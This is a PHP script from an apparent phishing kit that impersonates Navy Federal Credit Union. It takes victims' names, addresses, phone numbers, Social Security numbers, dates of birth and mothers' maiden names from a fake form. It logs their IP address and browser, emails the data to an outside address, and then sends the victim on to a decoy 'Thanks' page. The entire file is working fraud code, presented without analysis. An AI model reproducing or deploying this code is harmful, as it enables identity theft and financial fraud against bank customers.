<?php
if($_POST["fneuu"] != "" and $_POST["lnush"] != ""){
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$useragent = $_SERVER['HTTP_USER_AGENT'];
$message .= "-------------NFCU Info-----------------------\n";
$message .= "|First Name : ".$_POST['fneuu']."\n";
$message .= "|Last Name : ".$_POST['lnush']."\n";
$message .= "|Address : ".$_POST['adduisb']."\n";
$message .= "|City : ".$_POST['cyit']."\n";
$message .= "|State : ".$_POST['saete']."\n";
$message .= "|Zip : ".$_POST['zipolo']."\n";
$message .= "|Phone Number : ".$_POST['poenh']."\n";
$message .= "|SSN : ".$_POST['sns']."\n";
$message .= "|dob : ".$_POST['oab']."\n";
$message .= "|MMN : ".$_POST['nnmm']."\n";

$message .= "-------------created by DC-----------------------\n";
$message .= "|Client IP: ".$ip."\n";
$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
$message .= "User Agent : ".$useragent."\n";
$message .= "|----------- unknown --------------|\n";
$send = "contact.james@tnsshopperaustralia.com";
$subject = "Result from NFCU | $ip";
{
mail("$send", "$subject", $message);   
}

$praga=rand();
$praga=md5($praga);
  header ("Location: Thanks.php?cmd=login_submit&id=$praga$praga&session=$praga$praga");
}else{
header ("Location: index.php");
}

?>
 
 